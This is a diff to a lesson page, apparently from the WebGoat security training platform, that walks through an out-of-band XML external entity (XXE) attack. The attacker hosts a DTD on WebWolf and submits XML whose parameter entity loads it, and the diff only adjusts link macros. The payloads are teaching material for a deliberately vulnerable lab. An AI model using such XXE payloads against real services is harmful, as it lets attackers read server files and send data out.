@@ -13,7 +13,7 @@ We can again use WebWolf to host a file called `attack.dtd`, create this file wi
 [source, subs="macros, specialcharacters"]
 ----
 <?xml version="1.0" encoding="UTF-8"?>
-<!ENTITY ping SYSTEM 'webWolfRootLink:landing[noLink]'>
+<!ENTITY ping SYSTEM 'webWolfRootLink:landing[noLink, target=landing]'>
 ----
 
 Now submit the form change the xml using to:
@@ -22,7 +22,7 @@ Now submit the form change the xml using to:
 ----
 <?xml version="1.0"?>
 <!DOCTYPE root [
-<!ENTITY % remote SYSTEM "webWolfLink:files/attack.dtd[noLink]">
+<!ENTITY % remote SYSTEM "webWolfLink:[webWolfLink]">
 %remote;
 ]>
 <comment>
